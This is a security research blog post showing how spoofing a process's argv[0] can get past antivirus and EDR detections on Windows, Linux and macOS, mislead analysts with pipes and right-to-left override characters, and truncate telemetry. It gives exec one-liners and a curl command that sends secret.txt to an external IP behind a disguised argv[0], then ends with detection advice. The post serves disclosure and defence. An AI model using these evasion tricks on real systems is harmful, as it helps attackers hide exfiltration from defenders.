---
layout: post
title: Why bother with argv[0]?
tldr: The first argument of a program's command line, typically reflecting the program's name/path and often referred to as `argv[0]`, can in most cases be set to an arbitrary value without affecting the process' flow. Making the case against `argv[0]`, this post demonstrates how it can be used to deceive security analysts, bypass detections and break defensive software, across all main operating systems.
image: /assets/2024-09-03-argv0-spoofing-on-windows.png
tags: [argv&lsqb;0&rsqb;, argv0, argv, arg&lsqb;0&rsqb;, arg0, command line, command-line, cmd, command-line obfuscation, command-line bypass, edr obfuscation]
js: false
#tweet:
---

Command lines are weird. Windows is known for this [[1]], but as will become apparent, most operating systems implemented command lines in a way that can cause security issues. This post will set out, section by section, what's wrong with this widely-adopted convention that the first argument of a process' command line, often referred to as `argv[0]`, is reserved to represent the process' name.

## `argv[0]` is a relic of the past

Whenever a program is started, it is provided with command-line arguments that are accessible from within the program - in fact, it is one of the first pieces of information that is made available when a program starts, and is a key mechanism for altering a program's execution flow.

Consider the `exec` family of system calls as defined in POSIX [[2]], which is adopted by Unix-based systems as well as DOS/Win32 [[3]]. For example, it defines function `execv` as:

```c
int execv(const char *path, char *const argv[]);
```

Calling this function requires the full path of the application to be executed as `path` and a vector with arguments to be passed to the program as `argv`; it returns an integer with a status code. The same specification tells us that if a program is successfully executed as a result of this call, it will invoke the targeted program via

```c
int main (int argc, char *argv[]);
```

Across all C standards [[4]] we see that when a program is called like this, the following three conditions should hold true: `argc` is non-negative; `argv[argc]` is a null pointer; and if `argc` is greater than zero, the string pointed to by `argv[0]` represents the calling program's name.

To some, that final condition may be a surprising one. The new process surely knows its own name, why does it need to be passed as the first process argument by the calling process? It is a design decision made to allow the created process to behave differently based on how it is called. Especially in a POSIX context, in which applications can be and frequently are symlinked, it gives the new process awareness of what the calling process was requesting, regardless of what symbolic links were followed. A practical example of this are the `shutdown` and `reboot` programs; on Debian, these are symlinked to the same `systemctl` executable. Depending on what command you call, the underlying process will behave differently.
Although I am not aware of any such real-life examples for Windows, which has much less of a symlink culture, its implementation allows for the same to be possible.

This seems like a questionable design decision. Should a program be allowed to behave differently based on its name? From a 2020s standpoint, this seems highly undesirable, as it makes software less predictable and goes against modern design principles. From a 1970s/1980s standpoint, a time when computer resources were scarce, it seems less unreasonable to attempt to minimise any form of duplication and redundancy. Today however, disk space is no longer considered an issue; this is evidenced by macOS Sonoma, where `shutdown` and `reboot` are two separate executables. Another argument against this design is that if you have two programs that are so similar that it pays off to consolidate them into a single file, is there really a need for two separate programs/program names? Is using `shutdown` and `reboot` so much more preferable than something along the lines of `power --shutdown` and `power --reboot`? Some will answer this with a straight "no", whereas others argue single-word commands enhance user experience, and (especially a few decades ago) can offer cross-platform/backwards syntax compatibility using a shared code base. Even so, whether this solution is the best way of achieving that, remains doubtful.

Because even if you were to accept this principle, the implementation itself is debatable too. Why would one provide information on what program name was invoked as part of the process arguments, which are designed to be set by the calling process? Should the new process's code actually rely on `argv[0]`, it is at the mercy of the process that called it to populate it correctly. Should this not be the case, it may break the new process; similarly, there are examples of programs relying on `argv[0]` in their process flows in incorrect or unsafe ways [[5]], leading to security issues.
Instead, separating out what is now `argv[0]` to its own `task_struct`/PEB feature would appear to be a more solid approach: other "metadata" such as the process' path, current working directory, etc. are already kept here; it would allow for more consistent tracking and a reduced scope for manipulation. The operating system should be held responsible for populating the value, instead of expecting the calling program to do so.

The operating system that comes closest to doing this is, perhaps surprisingly, Windows. Unlike the other mainstream operating systems, Windows' own API calls for creating new processes (such as `CreateProcess` [[6]], `ShellExecute` [[7]]) do not allow you to set `argv[0]`: it sets it for you, based on how the path to the executable was provided. Given how C expects `argv` to be populated, this is actually the most sensible implementation. Still, because of Windows' adoption of the POSIX `exec` calls, there are still ways to manually set `argv[0]`.

[![Screenshot showing a Windows Task Manager window listing various command lines of running processes.](/assets/2024-09-03-windows-task-manager.png)](/assets/2024-09-03-windows-task-manager.png)
_As `argv[0]` usually tells you how the program was called, on Windows it shows you if it was invoked via an absolute path (e.g. 1st highlight) or a relative one (e.g. 3rd highlight); what casing was used (e.g. 2nd highlight is upper case) and if it was wrapped in quotes (4th highlight)._

## `argv[0]` is ignored (mostly)

Regardless of your stance on `argv[0]`, the painted picture is our reality; `argv[0]` is a concept we will have to live with. As we will see, this does not come without trouble: when making `exec` calls, the first two of the aforementioned three conditions are taken care of by the implementing operating system; but the final condition concerning `argv[0]` is not. Since the caller of `exec` has full control over `argv`, it is possible to ignore this requirement. Since the operating system nor the calling program nor the called program are expected to check for violations of this requirement, overriding it can be done without consequences.

For example, to print _Hello, world!_ with `echo`, the ___convention___ is to call e.g. `execv("/usr/bin/echo", ["echo", "Hello, world!"])`. However, executing `execv("/usr/bin/echo", ["oopsie", "Hello, world!"])` will also successfully call the `echo` program and print _Hello, world!_ to its stdout, despite having `argv[0]` set to "oopsie". Most likely, the `echo` program simply ignores whatever `argv[0]` is set to and solely focusses on `argv[1]` and beyond. In fact, this is an approach taken by most programs.

[![Screenshot showing Sysmon output for a normal execl() execution (left) and a manipulated one (right).](/assets/2024-09-03-execl-with-argv0.png)](/assets/2024-09-03-execl-with-argv0.png)
_Screenshot showing Sysmon [[8]] output for a 'normal' `execl()` call (left) and one with a manipulated `argv[0]` (right)._

Calling an application with a manipulated `argv[0]` is, as this example shows, easy from within C. Other programming languages as well as some scripting languages also provide accessible interfaces to achieve this:

```bash
python3 -c "import os; os.execvp('/path/to/binary', ['ARGV0', '--other', '--args', '--here'])"
perl -e 'exec {"/path/to/binary"} "ARGV0", "--other", "--args", "--here"'
ruby -e "exec(['/path/to/binary','ARGV0'],'--other', '--args', '--here')"
bash -c 'exec -a "ARGV0" /path/to/binary --other --args --here'
```

Thus, a key observation at this point is that manipulating `argv[0]` is straightforward and has no impact on most program executions. Yet, it has security implications, as we will see in the next three sections.

## `argv[0]` can break defences

First off, `argv[0]` can be used to fool security software. When a machine is compromised by a malicious user, it will typically manipulate the system in some way or another by running the attacker's commands. Often, this takes the form of leveraging system-native commands. Defensive software such as AV and EDR monitor process executions, and detect or prevent specific ones if they are deemed harmful. Most solutions proactively look for commands commonly used by attackers (e.g. [9], [10], [11]).

For example, the built-in `certutil` command-line tool on Windows is regularly seen in attacks [[12]] as a means to download an external payload after gaining an initial foothold. Windows' pre-installed security software, Microsoft Defender Antivirus [[13]], prevents `certutil` executions if it sees command-line arguments that suggest a file download is being attempted. As it turns out, the detection logic used by Defender is flawed: as the screenshot below shows, when starting `certutil` with `argv[0]` set to one or more spaces, Defender will not prevent the execution.

[![Screenshot showing a python execution triggering execvp(), calling certutil.exe without and with a manipulated argv[0] value.](/assets/2024-09-03-execvp-with-empty-argv0.png)](/assets/2024-09-03-execvp-with-empty-argv0.png)
_Using `python` to emulate a `execvp` call, a screenshot showing Windows Defender blocking a `certutil` execution (first attempt), but not if `argv[0]` is set to a single space (second attempt)._

Although perhaps not the most exciting of examples, it does highlight a wider issue: some detections rely on the program name being part of the command line. Let's for argument's sake pretend Defender's detection logic here could be represented as `command_line.contains('certutil') AND command_line.contains('-urlcache')`. You can see how the first condition assumes `certutil` is part of the command line. Whilst this will be almost always the case for the `certutil` executions it is trying to find, our example shows a counter-example that successfully bypasses this command-line detection. For this reason, it is strongly recommended to structure detections in a way similar to `process_path.endswith('certutil.exe') AND command_line.contains('-urlcache')`, as experienced detection engineers are likely to do.

Another way in which detections may be bypassed is by adding tuning keywords to `argv[0]`. It is common for detections to have a base condition that is complemented by additional conditions that filter out false positive alerts. For example, you may have a detection rule that triggers when `attrib.exe` is used to hide a file [[14]]. In practice, this happens often legitimately for file `desktop.ini`, so executions targetting this file may be tuned out [[15]]. If this is a known exclusion, an attacker could bypass such a detection by including `desktop.ini` in `argv[0]`, e.g. `argv = ['attrib_\desktop.ini', '+H', 'backdoor.exe']`[^i].

## `argv[0]` can deceive

Another way in which `argv[0]` can be exploited, is by manipulating it in such a way that it fools _humans_. As discussed before, in enterprise settings, security analysts often review alerts generated by security tooling such as EDR software. Most of such alerts will include the process that is responsible for/associated with the activity that was flagged. The process' command line is a key piece of information that analysts use to determine whether an alert should be further investigated, escalated, or ignored.

For example, an alert for possible data exfiltration might be triggered when `curl -T secret.txt 123.45.67.89` is executed [[16]], as it uploads file `secret.txt` to IP address 123.45.67.89 via HTTP [[17]]. A trained security analyst may further investigate this alert if this behaviour is rare in the environment. The fact that a hard-coded, external IP is used here might increase suspicion; especially if it was not seen before. With this in mind, attackers are more likely to be successful if they manage to make their activity "blend in" with normal activity, thus staying under the radar.

Now consider the same scenario, but with `argv[0]` changed from `curl` to `curl localhost | grep`. This may seem weird, but this is valid: as we have seen, in POSIX, process command lines are an array of strings[^ii], and its first element is nearly always ignored, so we can put in it whatever we want. What's more, security software often represents the array as a space-separated string. Thus, in this case, it will most likely be represented as `curl localhost | grep -T secret.txt 123.45.67.89`, despite the arguments that are being passed being `['curl localhost | grep', '-T', 'secret.txt', '123.45.67.89']`.

[![Diagram showing a curl command line broken down by argv, and demonstrating how manipulation can result in an unexpected EDR output.](/assets/2024-09-03-curl-argv0-manipulation.svg)](/assets/2024-09-03-curl-argv0-manipulation.svg)
_Diagram showing how changing `argv[0]` of a `curl` command can optically change what command is being executed._

To the human eye, it may now appear as if `curl localhost` is executed, and its output passed to `grep -T secret.txt 123.45.67.89`. Despite the latter not making much sense as a command, the command now has an entirely different meaning: it gives the impression `curl` is used to _download_ information from a _local_ address, even though in reality it is used to _upload_ information to a _remote_ address.

[![Screenshot showing the successful manipulation of a curl command by setting its argv[0] value to a deceiving value.](/assets/2024-09-03-spoofed-command.jpg)](/assets/2024-09-03-spoofed-command.jpg)
_The first window shows the execution of the spoofed `curl` command, with a `htop` window below it showing it was successful. The window on the right represents the external server, showing the contents of `secrets.txt` were successfully exfiltrated._

Another deception example is the use of the infamous Right-To-Left Override (RLO) character [[18], [19]]. The presence of this Unicode character will tell the rendering application to display the characters that follow in reverse order. Inserting the RLO at the end of `argv[0]` could therefore make `ping moc.elgoog.some-evil-website.com` look like `ping moc.etisbew-live-emos.google.com`. Whilst this will not affect detection logic (since it merely messes with how data is displayed), it may well deceive analysts.

[![Screenshot showing an 'obfuscated' PowerShell command line using the RLO character.](/assets/2024-09-03-powershell-rlo.jpg)](/assets/2024-09-03-powershell-rlo.jpg)
_Invoking a PowerShell command that downloads and executes BloodHound, with `argv[0]` containing the RLO character `\u202E`, makes it much harder to understand what is going on when looking at the reported command line._

## `argv[0]` can corrupt telemetry

Finally, there is another way in which `argv[0]` can raise issues, thanks to the remarkable fact that this often-ignored argument is at the very ___start___ of every command line. If you were to stuff `argv[0]` with enough characters, you will push all other arguments to the very end of the command line. This matters for two reasons: we could once again fool analysts by 'hiding' the interesting parts of the command line (hoping they don't scroll to the very end), but more interestingly, if you make the total command line length long enough, the actually relevant arguments may get truncated by monitoring software.

Since Windows 7, the maximum length of a command line on Windows is 14,336 characters [[20]], which equates to 14 KiB; in the Linux kernel the maximum is hardcoded to 32 page sizes [[21]] which on 64-bit architecture typically works out as 131,072 characters (128 KiB), whereas macOS Sonoma allows command lines to span up to a whopping 1,048,576 characters (1 MiB). That is a lot of arbitrary space `argv[0]` could potentially fill up.

Process monitoring software like EDR might either log such long command-line executions in full, or it may truncate it at a fixed length to reduce overhead. In case of the former, it is easy to see how someone might generate 1GiB worth of logging data on macOS by simply starting 1,000 processes utilising the maximum command-line length. Should some form of truncation be applied, it will be possible to cut off command-line arguments from the telemetry: a command like `perl -e 'exec {"echo"} "_"x50000, "Hello, world!"'` will successfully output "Hello, world!", but telemetry of the execution may just record a bunch of underscores, or in some cases even a completely empty command line. Thus, the relevant command-line arguments are not present, and detection logic as well as analysts will be blind to what is actually going on.

[![Screenshot showing EDR telemetry of a process event, demonstrating the command-line component was truncated.](/assets/2024-09-03-truncated-edr-entry.jpg)](/assets/2024-09-03-truncated-edr-entry.jpg)
_Although the `echo` command executed successfully, the process telemetry ending up in this SQL-based data lake only contains spoofed `argv[0]` data and no actual command-line arguments, as data is truncated at 32,766 characters._

## `argv[0]` considered harmful: prevention and detection

All in all, we see that in trying to solve one problem, the concept of `argv[0]` introduces several other problems. Since `argv[0]` won't be going away anytime soon, it is worth focussing on how to deal with this from a security standpoint.

Although software developers could validate whether the passed `argv[0]` has been tampered with by comparing it with its own filename, it is a solution that doesn't scale well, and as argued before, is something the operating system could do much more reliably. As relying on `argv[0]` for changing a program's flow is also highly inadvisable, developers are best off not interacting with it at all.

For security professionals, awareness of how `argv[0]` works and what flaws it introduces is an important step in countering any command-line deception. This post aims to help in this regard. Furthermore, it may be possible to automatically detect some `argv[0]`-based bypasses. Should your security software provide command-line arguments as an array instead of a space-separated string, it should be possible to reliably identify some of the described patterns. Overly long `argv[0]` values or ones containing suspicious characters like the pipe character should instantly be flagged as suspicious. Even with command-line arguments presented as a string, it should be possible to flag command lines that do not contain the program's name, which suggests it has been tampered with. The mere presence of an RLO character in a command line is in most environments a high-efficacy detection. For possibly truncated command-line arguments, make sure you understand how your security solution and data lake handle this and how it affects the generated telemetry; are single event entries capable of holding all command-line data, even when stretched to the maximum?

Finally, this post calls for defensive software to improve their detection of `argv[0]` abuse. Preventing software executions with suspicious `argv[0]` values should be possible without causing any false positives. EDR platforms should also consider leaving out `argv[0]` when reporting on command-line arguments, as this will eliminate nearly ever problem highlighted in this post; its forensic value is often minimal to none, or can be more reliably sourced from other process aspects.

Ultimately, nobody wants to be bothered by `argv[0]`. And neither should our software.

[1]: {% link _posts/2021-07-23-windows-command-line-obfuscation.md %}
[2]: https://pubs.opengroup.org/onlinepubs/9699919799/functions/execve.html
[3]: https://learn.microsoft.com/en-us/cpp/c-runtime-library/exec-wexec-functions
[4]: https://www.iso-9899.info/wiki/The_Standard
[5]: https://effectivemachines.com/2018/05/03/fixing-apache-hadoop-cve-2016-6811-argv0-vs-security/
[6]: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
[7]: https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea
[8]: https://github.com/Sysinternals/SysmonForLinux
[9]: https://lolbas-project.github.io
[10]: https://gtfobins.github.io
[11]: https://www.loobins.io/
[12]: https://redcanary.com/threat-detection-report/techniques/ingress-tool-transfer/
[13]: https://learn.microsoft.com/en-us/defender-endpoint/microsoft-defender-antivirus-windows
[14]: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/attrib
[15]: https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/windows/process_creation/proc_creation_win_attrib_hiding_files.yml#L23-L24
[16]: https://github.com/SigmaHQ/sigma/blob/782f0f524e6f797ea114fe0d87b22cb4abaa6b7c/rules/linux/process_creation/proc_creation_lnx_susp_curl_fileupload.yml
[17]: https://explainshell.com/explain?cmd=curl+-T+secret.txt+123.45.67.89
[18]: https://unicode-explorer.com/c/202E
[19]: https://www.mozilla.org/en-US/security/advisories/mfsa2009-62/
[20]: https://devblogs.microsoft.com/oldnewthing/20031210-00/?p=41553
[21]: https://github.com/torvalds/linux/blob/master/include/uapi/linux/binfmts.h#L9-L15

[^i]: Because in Windows command lines are represented as strings instead of arrays, adding spaces to `argv[0]` results in Windows only considering everything up to the first space as `argv[0]`. That is why for this example we use an underscore. We could however also have used the non-breaking space (`\u00A0`) or another Unicode space character to work around this Windows-specific quirk if we wanted to add a space to `argv[0]`.
[^ii]: As discussed in the previous note, Windows command lines are represented as strings; for POSIX-calls, the operating system turns the provided array into a space-separated string. Windows' dominance may explain why EDR software commonly represents command lines as a string instead of an array, regardless of operating system.

*[AV]: Anti Virus
*[EDR]: Endpoint Detection & Response, commonly found in enterprise
